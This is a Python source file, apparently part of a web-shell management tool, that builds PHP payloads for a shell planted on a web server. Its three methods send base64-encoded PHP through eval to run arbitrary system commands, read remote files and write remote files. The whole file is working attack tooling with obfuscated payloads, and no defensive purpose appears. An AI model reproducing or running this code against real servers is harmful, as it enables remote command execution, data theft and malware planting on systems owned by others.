#!/usr/bin/env python
# encoding: utf-8

import sys
sys.path.append('..')
from lib.core.payloader import Payloader
import base64

class PhpPayloader(Payloader):

    def parseCmd(self, osType, pwd, cmd, payload):
        if osType == 'windows':
            currentDirCmd = 'cd'
            divSymble = '&'
        else:
            currentDirCmd = 'pwd'
            divSymble = ';'
        cmd = 'cd ' + pwd + divSymble + cmd + divSymble + 'echo [S]' + divSymble + currentDirCmd + divSymble + 'echo [E]'
        payload['c0'] = base64.b64encode('system("' + cmd + '");')
        payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'

    def parseDownload(self, remoteFilePath, payload):
        payload['c1'] = remoteFilePath
        payload['c0'] = 'JGY9Zm9wZW4oJF9SRVFVRVNUWydjMSddLCdyJykgb3IgZGllKCdbU11OT0ZJTEVbRV0nKTtlY2hvIGZyZWFkKCRmLGZpbGVzaXplKCRfUkVRVUVTVFsnYzEnXSkpOw=='
        payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'

    def parseUpload(self, remoteFilePath, fileContent, payload):
        payload['c2'] = fileContent
        payload['c1'] = remoteFilePath
        payload['c0'] = 'JGY9Zm9wZW4oJF9SRVFVRVNUWydjMSddLCd3Jykgb3IgZGllKCdbU11OT0ZJTEVbRV0nKTtmd3JpdGUoJGYsJF9SRVFVRVNUWydjMiddKTtmY2xvc2UoJGYpOw=='
        payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'
